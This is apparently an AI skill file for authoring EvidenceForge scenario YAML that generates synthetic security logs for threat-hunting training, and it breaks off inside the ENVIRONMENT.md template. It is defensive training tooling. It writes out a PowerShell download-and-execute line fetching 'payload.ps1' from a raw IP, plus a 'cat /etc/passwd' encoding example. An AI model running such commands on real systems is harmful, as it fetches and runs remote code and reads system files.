---
name: eforge-scenario
license: Copyright (c) 2026 Cisco Systems, Inc. and its affiliates; SPDX-License-Identifier: MIT
description: >
  Create EvidenceForge scenario YAML files for generating realistic synthetic security log datasets.
  Use this skill whenever the user wants to create a new scenario, build a threat hunting exercise,
  design an attack simulation, generate security training data, or create synthetic log datasets.
  Also trigger when the user mentions "scenario", "attack scenario", "threat hunting dataset",
  "security logs", "log generation", "EvidenceForge", or wants to simulate any kind of cyber attack
  for training or testing purposes — even if they don't explicitly say "scenario".
---

# EvidenceForge Scenario Creator

You are helping the user create an EvidenceForge scenario YAML file that will drive deterministic generation of realistic, cross-correlated security log datasets. The generated scenario feeds into the `eforge generate` CLI which produces logs across up to 9 formats (Windows Event, Zeek, eCAR, syslog, bash_history, Snort alerts, web access, proxy access, Cisco ASA firewall logs).

The goal is a scenario that produces data useful for threat hunting training — realistic baseline noise mixed with a buried attack storyline that a hunter would need to find. The primary users are security professionals, though the data may be consumed by students and newcomers as well.

The engine now supports up to 9 log formats including Cisco ASA firewall logs (`cisco_asa`) with explicit firewall policy rules for allow/deny decisions.

Scenario YAML should name canonical log formats only. Target-specific renderings
such as SOF-ELK Snare Windows events or year-partitioned RFC3164 syslog are
selected at generation time with `eforge generate --target default|sof-elk`, not
encoded in the scenario.

## How This Works

EvidenceForge uses a two-phase approach:
1. **You** (the skill) help the user design the scenario through conversation
2. **`eforge generate`** deterministically produces logs from that scenario — no LLM involved, fully deterministic

The engine does NOT embellish or fill in details. Whatever you put in the scenario YAML is exactly what drives generation. This means you need to generate realistic, specific technical details: actual command lines, realistic file paths, proper IP addresses, correct process names. Vague or placeholder content produces vague logs.

Your job is to understand what the user wants, ask smart questions to fill gaps, and produce a valid, technically detailed scenario YAML file — plus an ENVIRONMENT.md companion document.

## Scenario Bundle Layout

Before writing any files, derive a stable slug from the scenario name and create/use
`scenarios/<slug>/` as the scenario root. A complete authored/generated exercise should stay
under that one directory:

```
scenarios/<slug>/
  scenario.yaml
  ENVIRONMENT.md
  artifacts/                 # Optional authored collateral only, such as phishing .eml files
  GROUND_TRUTH.md            # Created by generation
  OBSERVATION_MANIFEST.json  # Created by generation
  OUTPUT_TARGET.txt          # Created by generation
  data/                      # Created by generation for every output target
```

Do not write a single YAML file directly under `scenarios/`, repo-root environment files,
repo-root artifact directories, generic output directories, or target-named dataset directories. The output target
(`default` or `sof-elk`) changes source-native file rendering inside the bundle only; it must not
change the scenario root or create target-named directories.

## Interview Flow

Use a hybrid approach: let the user describe their idea first, then ask targeted follow-up questions to fill gaps. Don't present a checklist — have a conversation.

**Ask exactly ONE question per message.** Never bundle multiple questions in a single turn — it's overwhelming and users tend to only answer the first one. Use the `AskUserQuestion` tool if it's available to you; fall back to a conversational question if not. Either way, one question at a time. After the user answers, acknowledge briefly (one sentence max) and move to the next topic.

If the user gives a rich description up front, extract as much as you can from it before asking questions. If they're vague ("I need some attack data"), guide them through the key decisions.

### Key Topics to Cover

**The attack story** — This is the heart of the scenario and shapes everything else. What attack technique or kill chain should be buried in the data? Suggest a realistic attack chain with specific MITRE ATT&CK techniques and let the user confirm or adjust. When referencing ATT&CK, always use both name and ID — for example, "OS Credential Dumping (T1003)" or "Exploit Public-Facing Application (T1190)".

Multiple attackers and parallel attack paths are supported — for example, an external attacker doing credential stuffing while an insider exfiltrates data.

**The environment** — What kind of organization? (corporate office, retail store, hospital, cloud-native startup, manufacturing plant, etc.) This determines the mix of users, systems, and network topology. A 5-person startup looks very different from a 500-person enterprise.

**The network** — What does the network look like? Subnets, segments, where sensors are placed. The user might describe this conversationally, paste a text-based network diagram, or ask you to design a realistic network for the environment type. Network topology drives which connections are visible in the generated logs — without it, all connections are visible to all sensors.

**Log boundary** — Only include systems and logs that the victim organization would actually have access to. See the "Log Realism: What You'd Actually Have" section below for details. This is especially important for scenarios involving third parties, cloud services, or SaaS vendors.

**Scale and duration** — How many users and systems? What time window? If the user is aiming for something very large, you can advise them if you think the scale might make the exercise unwieldy, but it's ultimately their call. Every user must have a `primary_system` assigned — ensure there are enough workstations for all users (users can share systems, but each user needs a designated primary).

**Log formats** — Which formats should be generated? Windows Event Security and Zeek are the most common pair. Add the `ecar` output format for simulated EDR visibility, syslog + bash_history for Linux systems, Snort for IDS alerts, web_access for web server logs, proxy_access for forward proxy logs (captures outbound HTTP/HTTPS with cache status, CONNECT tunnels, and full URLs).

**System roles** — Assign `roles` to systems in the environment to drive both **outbound** traffic (connections the host initiates) and **inbound** traffic (connections the host receives). Roles like `web_server`, `database`, `mail_server`, `file_server`, `domain_controller` each have specific traffic profiles. For example, a `web_server` generates outbound database queries AND receives inbound HTTPS from external clients and internal users. A `database` generates outbound replication AND receives inbound SQL queries from web/app servers.

Inbound traffic respects network topology: DMZ-placed `web_server` hosts attract external HTTPS, while internal `database` hosts only receive queries from other internal systems. The firewall policy determines what gets permitted vs denied — denied inbound attempts produce firewall deny records visible to analysts.

`roles` and `services` drive the compiled world model, which decides what a host is for, which infrastructure systems exist, and whether remote activity should look like SSH, RDP, or generic network execution. For server and infrastructure hosts, always specify both whenever the user can provide them. Use `file_server` on Windows file shares so baseline SMB traffic targets them, not only domain controllers.

**Difficulty** — How hard should the attack be to find? This affects baseline noise intensity, how spread out the attack events are, and whether the attacker uses obvious or subtle techniques.

**Red herrings** — Should the dataset include explicit suspicious-but-benign events beyond automatic ambient noise? These are events with innocent explanations that create false leads for analysts: after-hours admin sessions, failed logon bursts from fat-fingered passwords, large outbound transfers that are actually backup sync, service accounts authenticating from unusual hosts. Define these in the `red_herrings:` section — they use the same event types as the storyline but include an `explanation` field for the instructor ground truth. Note: ambient suspicious noise (controlled by `baseline_activity.suspicious_noise`, default "high") is separate and always active.

**Browsing patterns** — How much web browsing does each user role generate? Personas have a default `browsing_intensity` (light/normal/heavy) that controls proxy session depth — how many pages and subresources each browsing session produces. Ask whether any user roles are heavier or lighter web users than their persona default suggests, and set per-user `browsing_intensity` overrides where appropriate.

**Traffic volume** — For scenarios that output server-side logs (especially `web_access`), the `intensity` setting controls how many top-level visitor actions web servers receive (low: ~20/hr, medium: ~1000/hr, high: ~5000/hr). Human page views automatically fan out into required page assets (JS, CSS, images, fonts, same-origin API calls) without consuming additional `web` budget. If the scenario focuses on server-side analysis (web scanners, access log anomalies), you likely need `intensity: high` or explicit `traffic_rates: {web: [5000, 12000]}` overrides to ensure attackers are buried in realistic background noise. Ask about expected noise-to-signal ratios for server-focused scenarios.

**Observation profile** — Default to `observation_profile: complete`. This preserves training-friendly perfect source coverage and correlation. Only choose another named profile such as `enterprise_standard` or `messy_collection` when the user explicitly wants source-native gaps, ingestion delays, or blind-review realism; do not invent per-source rates in scenario YAML.

**Stale accounts** — Does the organization have any disabled or inactive accounts that haven't been fully cleaned up? Former employees, decommissioned service accounts, or un-revoked contractor access are common in real environments. Add 2-4 stale accounts to `environment.stale_accounts` with `username`, `last_active` (ISO date), and `reason`. The engine automatically generates background noise from these: failed logons, Kerberos pre-auth failures on DCs, scheduled task failures, and service startup failures — creating realistic "why is this disabled account still here?" ambiguity for analysts.

**Attacker realism / messiness** — How polished is the attacker? Real attacks are messy — even skilled operators make mistakes, hit dead ends, and waste time on paths that go nowhere. Ask the user how much "fumbling" they want in the storyline. This ranges from a near-perfect surgical strike (rare, but appropriate for APT scenarios) to a sloppy novice who tries multiple approaches before succeeding. See the "Attacker Fumbles and Dead Ends" section below for implementation details.

### Persona Selection

EvidenceForge includes a library of 15 pre-built personas that are resolved automatically by name. Reference them in user definitions without defining them inline — the validator and engine resolve them from the built-in library. Custom personas in the project overlay (`.eforge/config/personas/`) are also available. Only define personas inline if you need to customize behavior for a single scenario. Run `eforge info personas` to see the full list of available persona names (including any overlay additions), or `eforge info --fields` to see all available queries.

| Persona | Work Hours | Risk Profile | Typical Role |
|---------|-----------|--------------|-------------|
| developer | 9am-6pm (lunch 12-1) | high | Software engineer |
| sysadmin | 8am-6pm (lunch 12-1) | high | System administrator |
| security_analyst | 9am-5pm (lunch 12-1) | high | SOC analyst |
| analyst | 8am-5pm (lunch 12-1) | medium | Business analyst |
| data_analyst | 8am-5pm (lunch 12-1) | medium | Data/BI analyst |
| executive | 8am-7pm (lunch 12-1) | medium | C-suite / director |
| project_manager | 8am-6pm (lunch 12-1) | medium | PM / scrum master |
| accountant | 8am-5pm (lunch 12-1) | medium | Finance / accounting |
| sales | 8am-6pm (lunch 12-1) | medium | Sales representative |
| marketing | 9am-6pm (lunch 12-1) | medium | Marketing staff |
| hr | 8am-5pm (lunch 12-1) | medium | Human resources |
| help_desk | 8am-6pm (lunch 12-1) | medium | IT help desk |
| legal_counsel | 9am-6pm (lunch 12-1) | low | Legal / compliance |
| receptionist | 8am-5pm (lunch 12-1) | low | Front desk |
| intern | 9am-5pm (lunch 12-1) | low | Intern / trainee |

You can also define custom personas inline in the scenario if none of the pre-built ones fit (e.g., for a retail cashier or hospital nurse). Custom personas use the same schema.

### Generating Realistic Users

Every user should have a realistic, natural-sounding name by default. Think diverse, real-world names — not generic placeholders:

Good: `marcus.chen`, `priya.patel`, `sarah.oconnell`, `diego.ramirez`, `aisha.johnson`
Bad: `jsmith`, `user01`, `shift_manager`, `test_user`

The username format should follow a consistent convention for the organization (e.g., `first.last`, `firstinitial.last`, `flast`). Pick one convention and stick with it across the scenario.

**Service/system accounts** are the exception — names like `svc_backup`, `sql_agent`, or `ftp_service` are fine when needed for the story or environment realism. Only add these when they're needed.

### Modeling Threat Actors

**External attackers do NOT have their own accounts in the victim organization.** Never create a user called `attacker`, `hacker`, `threat_actor`, or anything obviously malicious. Real attackers operate by:

- **Compromising legitimate accounts** — The attacker gains credentials for an existing user (via phishing, credential stuffing, password spraying, etc.) and uses that account. The storyline `actor` field is the compromised user's username. This is the most common case.
- **Operating at the system level** — Some attacks don't involve user accounts at all (e.g., exploiting a vulnerable service). The actor can be a system account like `SYSTEM`, `NT AUTHORITY\SYSTEM`, `root`, or the service account running the exploited application. Well-known OS built-in accounts (`SYSTEM`, `root`, `LOCAL SERVICE`, etc.) are automatically accepted by the validator. For custom service accounts (e.g., `svc_backup`, `apache`), add them to `environment.service_accounts`.
- **Creating new accounts (rare)** — If the attacker creates accounts for persistence, those accounts must have blending-in names like `svc_sqlbackup`, `admin.temp`, or `backup.service` — never `attacker1` or `evil_admin`. Add these to `environment.service_accounts` so they're valid storyline actors.

**Insider threats** use their own legitimate account — they're already in the users list with a normal name.

### Realistic Naming for Attacker Infrastructure and Tools

Everything the attacker controls should look plausible at first glance and boring in aggregate. The whole point of threat hunting training is that the data looks realistic — obvious names are a dead giveaway, but names that neatly explain the attack are also a tell. Do not turn domains, service accounts, scheduled tasks, archive names, or process names into semantic breadcrumbs for the hunter.

Good naming follows the victim organization's conventions, uses mundane abbreviations, legacy labels, ticket-like numbers, vendor-like terms, and occasional inconsistency. Bad naming summarizes the artifact's role in the scenario, even if it is not overtly malicious.

**C2 servers and malicious domains:**
- Good: `brynwell.io`, `mosaic-metrics.net`, `evergreenads.co`, `northlakeportal.com`
- Bad: `evil-c2.com`, `malware-server.net`, `attacker-infra.io`, `hack.evil.com`, `cdn-assets-update.com`, `graph-api-auth.com`

**Malicious files and processes:**
- Good: `brsvc.exe`, `taskhostw32.exe`, `watchd`, `msidxsvc.exe`
- Bad: `my_password_dumper.exe`, `evil_payload.ps1`, `hack_tool.bat`, `malware.exe`, `db_dump_agent.exe`, `exfil_worker.sh`

**Created accounts, services, scheduled tasks, and staging archives:**
- Good: `svc_ops03`, `adm_maint`, `printmon`, `CacheTask`, `tmp-4721.zip`, `q3_rollup.dat`
- Bad: `attacker1`, `evil_admin`, `HealthMonitorSvc`, `svc_sqlreader`, `ExfilTask`, `patient_claims.sql.gz`
- Source business files may have descriptive names; attacker-created staging bundles should usually look like ordinary temp, report, backup, or build artifacts instead of naming the exact theft objective.

**Attacker email addresses** (for phishing "From:" lines, etc.):
- Good: `support@accounts-verify.com`, `noreply@hr-benefits-portal.net`, `j.martinez@consulting-group.com`
- Bad: `attacker@external`, `hacker@evil.com`, `phishing@malicious.net`

**Exception — real tool names:** When the scenario uses a well-known attack tool, use its real name. `mimikatz.exe` is mimikatz. `PsExec.exe` is PsExec. `nmap`, `Rubeus.exe`, `SharpHound.exe`, `Cobalt Strike` — all fine. The rule is: don't *invent* names that scream "malicious", but don't rename real tools either.

### Log Realism: What You'd Actually Have

A critical principle: **only generate logs that the victim organization would realistically collect.** The scenario must model the defender's actual visibility, not an omniscient view of the attack.

**You have logs from systems you own and operate.** This includes:
- Workstations, servers, and domain controllers in the org's own infrastructure
- Network sensors (Zeek, Snort, firewall) deployed on the org's own network
- On-prem applications the org runs itself

**You do NOT have OS-level logs from third parties.** This is the most common mistake. If the scenario involves a SaaS vendor, cloud provider, MSP, or any external organization:
- You would **never** have their syslog, Windows Event logs, bash_history, or any OS-level telemetry from their servers
- You **might** have application-level audit logs from the service (e.g., SaaS admin console logs, OAuth token grants, API access logs) — but only if the scenario explicitly establishes this (e.g., "the contract includes audit log access")
- You **would** see the network traffic between your systems and theirs (via your own network sensors)
- You **would** see the effects on your own systems (e.g., a malicious update pushed from the compromised vendor hits your endpoints — you see that on your endpoints)

**Examples of what this means in practice:**

| Scenario Element | You HAVE | You DON'T Have |
|---|---|---|
| SaaS vendor compromised | Network connections to vendor IPs from your systems; effects on your endpoints when malicious update arrives | Vendor's server syslog, their internal lateral movement, their OS-level logs |
| Cloud-hosted app (your tenant) | Application audit logs (if configured), network flows to cloud IPs | The cloud provider's hypervisor logs, their infrastructure syslog |
| Partner VPN connection | Your firewall/VPN logs for the tunnel, traffic through your network sensors | The partner's internal network logs, their endpoint telemetry |
| Attacker's C2 server | Outbound connections from your network to the C2 IP (via Zeek/Snort) | The C2 server's access logs, the attacker's tooling output |

**When designing the systems list:** Do not add systems for third-party infrastructure. If a SaaS vendor's server is involved in the attack, it exists only as an external IP address that appears in network connections and storyline details — not as a system with a hostname, OS, and assigned user in your environment.

## Scenario YAML Schema

Use the `/eforge:references:scenario-reference` skill to load the full schema reference. Here is the essential structure:

```yaml
version: "1.0"
name: scenario-name              # Alphanumeric, dashes, underscores only
description: |
  Multi-line description of the scenario

environment:
  description: "Organization/environment description"

  timezone:                       # Optional (defaults to UTC)
    default: "America/New_York"
    systems:                      # Optional pattern-based overrides (fnmatch glob)
      "EU-*": "Europe/London"

  users:
    - username: marcus.chen
      full_name: "Marcus Chen"
      email: marcus.chen@example.com
      persona: developer          # Must reference a persona name
      primary_system: WS-DEV-01   # Required — must reference a system hostname
      enabled: true               # Default: true
      groups: ["engineering"]     # Optional

  systems:
    - hostname: WS-DEV-01        # RFC 1123 compliant
      ip: "10.0.1.10"            # IPv4 address
      os: "Windows 10"           # OS determines which log formats are generated
      type: workstation           # workstation | server | domain_controller
      assigned_user: marcus.chen  # Optional
      services: []               # Optional, but valuable for server realism
      roles: []                  # Optional, but strongly recommended for servers/proxies

  service_accounts: []             # Optional: custom service/system accounts valid as storyline actors

  stale_accounts:                  # Optional: inactive accounts for background noise
    - username: former.employee
      last_active: "2023-11-15"
      reason: "Left the company"

  groups:                         # Optional
    - name: engineering
      members: [marcus.chen]

  network:                        # Optional but recommended for realism
    public_cidrs: ["45.83.220.0/28"]  # Org's lab public IP block (auto-derived from VIPs if omitted)
    segments:
      - name: corporate_lan
        cidr: "10.0.1.0/24"
        description: "Corporate workstation network"
        systems: [WS-DEV-01]     # Must reference existing hostnames
    sensors:
      - type: network             # network | ids | firewall
        name: core-tap
        monitoring_segments: [corporate_lan]
        direction: bidirectional  # bidirectional | inbound | outbound
        placement: span           # span mirrors segment traffic | tap observes uplink/boundary traffic
        log_formats: [zeek]
      # Firewall sensors (type: firewall) add: interfaces, default_action,
      # deny_ratio, policy rules, nat_rules, threat_detection_rate.
      # See /eforge:references:scenario-reference for the full firewall schema.

personas:                         # Define inline or reference pre-built from personas/
  - name: developer               # Only needed for custom personas; pre-built ones resolve by name
    description: "Software developer"
    work_hours: "9am-5pm (lunch 12pm-1pm)"
    risk_profile: low             # low | medium | high

time_window:
  start: "2024-01-15T10:00:00Z"  # ISO 8601 UTC
  duration: "8h"                  # OR use end: "2024-01-15T18:00:00Z"
  warmup: "8h"                    # Optional (default "8h", minimum "1h"). Pre-populates DNS
                                  # cache, process trees, sessions before start.

# Ensure every storyline and red_herring time falls inside time_window. If the
# last attack step is at +36h, use duration >= "37h" so baseline and signal
# sources share the same collection horizon.

baseline_activity:
  description: "Normal office activity"
  intensity: medium               # low|medium|high — scales ALL background traffic types
  variation: medium               # low (±10%) | medium (±25%) | high (±50%)
  # traffic_rates:                # Optional: per-traffic-type overrides
  #   web: [5000, 12000]          # range | int | preset name (low|medium|high)
  #   kerberos: low               # use low-level rates for this type only

logon_grace_period: "30m"         # Optional (default "30m") — suppresses "no prior logon"
                                  # warnings for events within this duration of time_window.start

observation_profile: complete     # Optional (default complete). Use complete unless the user
                                  # explicitly wants realistic source gaps/delays.

storyline:                        # The attack events to bury in the data
  - id: evt-recon-whoami          # Required: unique event ID. Use descriptive labels
                                  # (e.g., "evt-lateral-ssh", "evt-c2-beacon-day2") or
                                  # sequential IDs ("evt-001"). Must be unique across all events.
    time: "+2h"                   # Relative offset from start, or absolute ISO 8601
    actor: marcus.chen            # Username of compromised account (or system account)
    system: WS-DEV-01             # Must reference existing hostname
    activity: "Recon: enumerate current user"  # Human-readable (for GROUND_TRUTH.md only)
    events:                       # Typed event declarations — validated per-type fields
      - type: process
        process_name: "C:\\Windows\\System32\\whoami.exe"
        command_line: "whoami"
        technique: "T1033 - System Owner/User Discovery"

red_herrings:                     # Optional: suspicious-but-benign events
  - id: rh-afterhours
    time: "+3h"
    actor: sarah.admin
    system: DC-01
    activity: "After-hours server check"
    explanation: "Routine sysadmin maintenance outside business hours"
    events:
      - type: logon
        logon_type: 10

output:
  logs:
    - format: windows
    - format: zeek
    # Available: windows, zeek, ecar, syslog, bash_history,
    #            snort_alert, cisco_asa, web_access, proxy_access
  destination: "scenarios/<slug>"
  compression: false
```

Log format routing, proxy configuration, database service inference, firewall NAT rules, and external inbound requirements are documented in `/eforge:references:scenario-reference`. For output field documentation and known limitations, use `/eforge:references:evidence-formats`.

### Validation Rules

The scenario is validated before generation. Common issues to avoid:
- Every `user.persona` must match a persona name (from inline personas or pre-built library)
- Every user must have a `primary_system` assigned, and it must match a system hostname
- Every `system.assigned_user` must match a username
- Every storyline `actor` must be a username defined in the users list, a well-known built-in account (e.g., `SYSTEM`, `root`), or listed in `environment.service_accounts`
- Every storyline `system` must match a system hostname
- Every storyline event must have a unique `id` field — no duplicates allowed
- Usernames, hostnames, and IPs must all be unique
- Network segment `systems` must reference existing hostnames
- Network sensor `monitoring_segments` must reference existing segment names

Even when validation passes, weak host metadata can still reduce realism. If a dataset needs believable server-to-server traffic or admin pivots, make sure important hosts have meaningful `roles` and `services`, and every user has the right `primary_system`.

## Building the Storyline

The storyline is the most important part — it's what the threat hunter will be looking for. Think about it as a realistic attack narrative that follows a kill chain:

1. **Initial Access (TA0001)** — How does the attacker get in? Phishing (T1566), Exploit Public-Facing Application (T1190), Valid Accounts (T1078)
2. **Execution (TA0002)** — What runs? Command and Scripting Interpreter (T1059), Scheduled Task/Job (T1053)
3. **Persistence (TA0003)** — How do they maintain access? Scheduled Task/Job (T1053), Create Account (T1136), Server Software Component (T1505)
4. **Privilege Escalation (TA0004)** — How do they get higher privileges? Abuse Elevation Control Mechanism (T1548), Valid Accounts: Domain Accounts (T1078.002). On Linux, check for sudo misconfigurations, SUID binaries. On Windows, credential dumping leads to domain admin.
5. **Defense Evasion (TA0005)** — How do they avoid detection? Impair Defenses (T1562), Indicator Removal (T1070). Consider disabling AV, clearing logs, timestomping.
6. **Credential Access (TA0006)** — How do they get credentials? OS Credential Dumping (T1003), Unsecured Credentials (T1552), Kerberoasting (T1558.003)
7. **Discovery (TA0007)** — What does the attacker enumerate? System Information Discovery (T1082), Account Discovery (T1087), Network Service Discovery (T1046)
8. **Lateral Movement (TA0008)** — How do they spread? Remote Services (T1021), Use Alternate Authentication Material (T1550)
9. **Collection & Exfiltration (TA0009/TA0010)** — What's the goal? Data from Local System (T1005), Exfiltration Over C2 Channel (T1041), Exfiltration Over Web Service (T1567)
10. **Impact (TA0040)** — If applicable: Data Encrypted for Impact (T1486), Inhibit System Recovery (T1490)

Not every scenario needs all phases — an insider threat won't have privilege escalation if they already have access, a ransomware attack emphasizes impact over exfiltration. But actively consider each phase and include it when it makes the attack realistic. Omitting privilege escalation or persistence from an external attacker scenario is a common gap that makes the storyline feel incomplete.

### Attacker Fumbles and Dead Ends

Real attackers are not perfect. Even experienced operators make mistakes, hit dead ends, and waste time on approaches that don't pan out. Including this messiness makes the data dramatically more realistic and the hunt more interesting — a surgical, zero-waste attack is actually harder to believe than one with false starts.

Based on the user's chosen attacker realism level, weave fumbles and dead ends into the storyline. These are **valid storyline events using standard event types** — the engine handles them normally. The "error" is in-universe (the simulated attacker made a mistake), not in the data structure.

**Mistakes** — the attacker does something wrong and has to correct it:
- Failed logon attempts before finding valid credentials (`failed_logon` events)
- Mistyped executable or path in a command (`process` event with wrong binary name, followed by the correct one)
- Connection to the wrong host or port (`connection` event that produces a Zeek S0/REJ record)
- Running a tool with incorrect flags that produces an error, then re-running correctly
- Attempting to access a resource they don't have permissions for

**Dead ends** — the attacker tries something that technically works but doesn't achieve their goal:
- Searching for files matching a pattern and finding nothing (e.g., `dir /s *.kdbx` on a system with no KeePass databases)
- Attempting lateral movement to a host via multiple methods (RDP, PsExec, WMI) but failing on each, then moving to a different target
- Running recon commands that return unhelpful results (e.g., `net group "Domain Admins"` on a system where the attacker already has the info)
- Enumerating a network share that turns out to be empty or irrelevant
- Connecting to a database that doesn't contain the data they're looking for

These are just examples — invent additional realistic variations appropriate to the specific scenario and attack chain. A novice attacker might have 5-8 fumbles scattered throughout the storyline; a skilled operator might have 1-2 subtle dead ends. Scale the messiness to the user's chosen level.

**Placement:** Fumbles work best right before a successful action (failed logon → successful logon) or as abandoned branches between kill chain phases. Don't cluster them all at the beginning — distribute them throughout the storyline.

**Storyline timing:** Events within a multi-event storyline step are automatically spaced with human typing rhythm (1-2 second gaps with occasional thinking pauses). You don't need to create separate storyline steps for sequential commands — put them in the same step's `events` list and the engine will space them realistically.

When building storyline events, each entry needs an `events` list with typed declarations. Be technically specific — the engine uses these fields directly.

**Available event types:** `process`, `logon`, `failed_logon`, `logoff`, `connection`, `ssh_session`, `rdp_session`, `account_created`, `account_deleted`, `group_member_added`, `service_installed`, `scheduled_task_created`, `log_cleared`, `create_remote_thread`, `dhcp_lease`, `port_scan`, `beacon`, `dns_query`, `web_scan`, `credential_spray`, `dga_queries`, `dns_tunnel`, `explicit_credentials`, `workstation_lock`, `workstation_unlock`, `raw`

Correlated multi-event activities such as `ssh_session` and process-owned endpoint
side effects are modeled internally as action bundles. Authors should still write
the same typed event, not duplicate the Zeek connection, syslog auth rows,
EDR/eCAR session/process rows, shell process setup, or process-owned
file/module/registry evidence by hand.

**Firewall/network event types:**
- `port_scan` — Bulk denied connections for recon/scanning. Fields: `target_ips` or `target_segment`+`target_count`, `ports`, `protocol`, `scan_rate`. Produces ASA 106023 denies + correlated Zeek conn entries.
- `beacon` — Periodic connections (allowed or denied). Fields: `dst_ip`, `dst_port`, `interval`, one of `end_time`/`duration`/`count`, `action` (allow/deny, default: allow), `jitter` (default: 0.15), `referrer` (optional HTTP Referer, auto-generated if omitted), plus all `connection` fields. In explicit proxy mode, HTTP/S beacons from proxied hosts traverse the proxy; use `action: deny` for proxy- or firewall-blocked beaconing.
- `web_scan` — Bulk HTTP scanning from presets. Fields: `dst_ip`, `rate` (average requests/second; exact only when `count` is set), `preset` (nikto/dirb/gobuster/sqlmap/nmap_http) or `paths`, `hostname`, `user_agent`, `jitter` (default: 0.4). Automatically generates Snort IDS alerts: scanner UA detection (Layer 1, non-TLS only), per-path content alerts for probe-specific SIDs (Layer 2, non-TLS only), and connection-rate threshold alerts (Layer 3, both TLS and non-TLS). Referer headers are generated per-preset according to real scanner behavior (Nikto: partial-crawl same-origin ~30%; others: none). Per-request UA token substitution produces varied values for templated scanner UAs (e.g., Nikto's Test: ID). IDS alert definitions and `send_referrer` config are in `web_scan_presets.yaml`.
- `credential_spray` — Bulk auth attacks. Fields: `target_accounts`, `interval`, `pattern` (spray/brute_force/stuffing), `success` ({account, after}), `jitter` (default: 0.5). OS-aware: Windows 4625/4776 or Linux syslog.
- `dns_query` — Standalone DNS query. Fields: `query`, `qtype`, `rcode`, `ttl`, `answer` (required for NOERROR).
- `dga_queries` — Bulk DGA domain lookups. Fields: `interval`, `length_range`, `charset`, `tld`, `seed`, `rcode_distribution`, `answer_ip`.
- `dns_tunnel` — DNS exfiltration via encoded subdomains. Fields: `base_domain`, `encoding` (base32/base64/hex), `qtype` (TXT/NULL/CNAME), `label_length`, `payload`/`payload_size`.
- `explicit_credentials` — RunAs / pass-the-hash / service account delegation (4648). Fields: `target_username`, `target_server`, `process_name`, `source_ip`.
- `workstation_lock` — Lock workstation (4800). No additional fields.
- `workstation_unlock` — Unlock workstation (4801 + 4624 type 7 re-auth). No additional fields.

The `raw` type targets a specific output format with arbitrary fields — use it for events without a dedicated type. Requires `target_format` and `fields` dict. Raw events bypass cross-format correlation, so prefer typed events when available.

**Key authoring rules:**

- **Process + connection pairing:** When a command line references a domain (Invoke-WebRequest, curl, wget), always add a paired `connection` event with `hostname` set. Without it, the domain appears in Sysmon but is absent from DNS, SSL, HTTP, and proxy logs. For raw-IP commands, the connection alone (no `hostname`) is sufficient.
- **HTTP visibility:** For `service: http` connections, specify `method`, `uri`, and `user_agent`. Without them the engine auto-generates generic metadata that won't reflect actual attack activity. For `service: ssl`, these fields aren't needed.
- **`hostname` on connections:** Use the client-facing DNS name actually resolved by the endpoint — not a reverse-DNS/PTR artifact. This keeps DNS, TLS SNI, x509 subject, and proxy logs consistent. Omit `hostname` for raw-IP C2.
- **No documentation domains in generated data:** Don't use `example.com`, `example.net`, or `example.org` as live public infrastructure — they're an obvious synthetic tell. Use a realistic non-reserved domain.
- **Prefer full image paths:** Bare executable names are accepted but full paths produce more accurate logs. Don't invent one-off paths — add a config overlay entry instead.
- **Linux commands:** Use `type: process` with Linux binary paths (`/usr/bin/cat`, `/bin/bash`).
- **Web attacks:** Use `connection` with `service: http`, not `raw` with `target_format: web_access` — the latter bypasses cross-source correlation.

**Causal expansion — auto-generated prerequisite events:** The engine automatically emits DNS lookups before TCP connections, Kerberos TGT/TGS before domain logons, ProcessAccess after lsass `create_remote_thread`, audit events from admin command patterns, and RSAT session evidence for DC admin activity. Only specify these manually when they are the attack narrative itself (DNS tunneling, golden ticket forging). The validator warns on redundant manual specifications.

For realism-bound scenarios, do not use RFC 5737 TEST-NET ranges (`192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`) for public NATs, C2, scanners, or attacker infrastructure. Those ranges are safe for documentation snippets, but they are an obvious synthetic-data tell in generated logs. Use private ranges (10.x, 172.16-31.x, 192.168.x) for internal systems, and use a scenario-owned lab public allocation or generated non-reserved public-looking addresses for external infrastructure.

### Long Time Windows and Baseline Exercises

For scenarios spanning 2+ weeks (e.g., 30-day baseline exercises), scope `output.logs` to only the formats needed for the exercise. Generating all formats over a long time window produces very large datasets and slow generation; declaring just `format: zeek_conn` instead of the full `zeek` group can cut generation time dramatically. The `--formats` CLI flag can also filter at runtime without editing the YAML.

For baseline deviation exercises (e.g., "spot the change in normal traffic"), use `beacon` events with `start_time` offsets and `orig_bytes`/`resp_bytes` overrides to layer gradual drift on top of a stable baseline, rather than modifying `baseline_activity.intensity`. For example, a beacon starting at `+14d` with increasing `orig_bytes` models a compromised host whose C2 traffic grows over time while the rest of the environment stays consistent.

### Encoded Payloads Must Be Real

When a storyline event includes base64-encoded data, obfuscated commands, or any other encoded content, the encoding must be accurate and decodable — never fake strings that just "look like" base64. Use the Bash tool to produce real encodings.

For PowerShell's `-EncodedCommand` flag (which expects UTF-16LE base64):
```bash
echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://45.83.221.45/payload.ps1")' | iconv -t UTF-16LE | base64
```

For plain base64 (Linux commands, general obfuscation):
```bash
echo -n 'cat /etc/passwd' | base64
```

Always generate the encoded string via Bash and paste the real output into the scenario YAML. A threat hunter who decodes the base64 should find the actual command inside.

For the `time` field, prefer relative offsets from the scenario start ("+15m", "+1h30m", "+2h") — they're easier to read and relocatable. Units supported: `d` (days), `h` (hours), `m` (minutes), `s` (seconds), `ms` (milliseconds). Use seconds/milliseconds for rapid sequences like password sprays ("+20m30s", "+20m30s500ms"). Space events realistically: real attackers pause between steps, but don't drag reconnaissance over 6 hours either.

## ENVIRONMENT.md — Student Context Document

After generating the scenario YAML, also create an `ENVIRONMENT.md` file in the same directory as the scenario file. This document provides organizational context to the person analyzing the generated data — like a briefing packet a new SOC analyst would receive on their first day.

**ENVIRONMENT.md must contain ZERO information about the attack storyline or any malicious/suspicious activity.** It is purely organizational context.

### Content and Format

```markdown
# [Organization Name] — Environment Summary

## Overview

[Brief description of the organization, drawn from environment.description.]

- **Timezone:** [timezone] ([UTC offset at scenario time])
- **All log timestamps are in UTC.** Business hours are approximately HH:MM–HH:MM UTC.
- **Data window:** [start] to [end] ([duration])
- **Approximate environment size:** [N] users, [M] systems/devices

## User Directory

| Username | Full Name | Email | Role | Department | Primary System |
|----------|-----------|-------|------|------------|----------------|
| ... | ... | ... | ... | ... | ... |

[Approximately N users shown. Full directory available on request.]

## Systems Inventory

| Hostname | IP Address | OS | Type | Services |
|----------|------------|-----|------|----------|
| ... | ... | ... | ... | ... |

## Network Topology

### Subnets

| Segment | CIDR | Description |
|---------|------|-------------|
| ... | ... | ... |

